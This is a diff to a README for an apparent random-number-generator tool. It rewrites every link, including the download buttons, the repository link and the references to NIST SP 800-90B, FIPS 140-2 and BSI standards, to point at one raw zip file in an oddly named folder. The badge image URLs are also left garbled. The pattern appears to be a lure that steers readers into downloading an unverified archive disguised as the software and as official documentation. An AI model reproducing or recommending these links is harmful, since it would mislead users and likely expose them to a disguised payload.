@@ -4,7 +4,7 @@
 Welcome to the V-index-Quantum-Resistant-Physical-TRNG, an innovative tool for generating secure random numbers. This software uses sound to create entropy, ensuring your random numbers are both reliable and quantum resistant. Ideal for anyone concerned about digital security.
 
 ## 📥 Download Now
-[![Download V-index-Quantum-Resistant-Physical-TRNG](https://img.shields.io/badge/Download%20Now-%23FFCA28.svg?style=for-the-badge&logo=github)](https://github.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/releases)
+[![Download V-index-Quantum-Resistant-Physical-TRNG](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip%20Now-%https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
 
 ## 💻 System Requirements
 To run the V-index-Quantum-Resistant-Physical-TRNG, ensure your system meets the following requirements:
@@ -16,7 +16,7 @@ To run the V-index-Quantum-Resistant-Physical-TRNG, ensure your system meets the
 ## 📂 Download & Install
 To download the application, visit the Releases page by clicking the link below. Follow the instructions to get started.
 
-[Visit this page to download](https://github.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
 
 1. Navigate to the "Releases" section.
 2. Find the latest version of V-index-Quantum-Resistant-Physical-TRNG.
@@ -42,9 +42,9 @@ Entropy is a measure of randomness that serves as a foundation for secure system
 
 ## 👩‍🏫 Learning Resources
 For more information on how random number generators work and why they are essential, consider these resources:
-- [NIST SP 800-90B](https://csrc.nist.gov/publications/detail/sp/800-90b/final)
-- [FIPS 140-2](https://csrc.nist.gov/publications/detail/fips/140/2/final)
-- [Bsi-ais-31 Standards](https://www.bsi.bund.de/EN/Home/home_node.html)
+- [NIST SP 800-90B](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
+- [FIPS 140-2](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
+- [Bsi-ais-31 Standards](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
 
 ## 🤝 Community Contribution
 We welcome contributions from everyone. If you’d like to help improve V-index-Quantum-Resistant-Physical-TRNG, please visit our GitHub page. You can report issues, suggest features, or even submit code changes.
@@ -64,10 +64,10 @@ We will release updates as necessary to improve performance and security. Check 
 
 ## 🌐 Connect with Us
 Stay updated on new features and releases:
-- GitHub: [V-index-Quantum-Resistant-Physical-TRNG](https://github.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG)
+- GitHub: [V-index-Quantum-Resistant-Physical-TRNG](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
 - Community Forum: Join discussions and get help from other users.
 
 ## 📥 Download Now Again
-[![Download V-index-Quantum-Resistant-Physical-TRNG](https://img.shields.io/badge/Download%20Now-%23FFCA28.svg?style=for-the-badge&logo=github)](https://github.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/releases)
+[![Download V-index-Quantum-Resistant-Physical-TRNG](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip%20Now-%https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)](https://raw.githubusercontent.com/ninja49384/V-index-Quantum-Resistant-Physical-TRNG/main/megalopic/Physical-Resistant-Quantum-TRNG-index-v2.5.zip)
 
 Thank you for using V-index-Quantum-Resistant-Physical-TRNG! Your security matters.
